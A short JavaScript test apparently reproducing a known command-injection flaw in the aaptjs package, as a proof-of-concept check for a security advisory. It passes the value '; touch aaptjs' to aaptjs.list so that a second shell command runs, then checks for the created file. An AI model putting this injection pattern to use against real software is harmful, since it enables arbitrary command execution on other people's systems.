//https://github.com/advisories/GHSA-4g7x-7vgq-3j28
test("Remote code execution in aaptjs", () => {
  const aaptjs = require("aaptjs");
  const fs = require("fs");
  const path = "./aaptjs";
  // const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    aaptjs.list("; touch aaptjs", (err, data) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);

      fs.unlinkSync(path, function (err) {});
    });
  } catch (error) {}
});
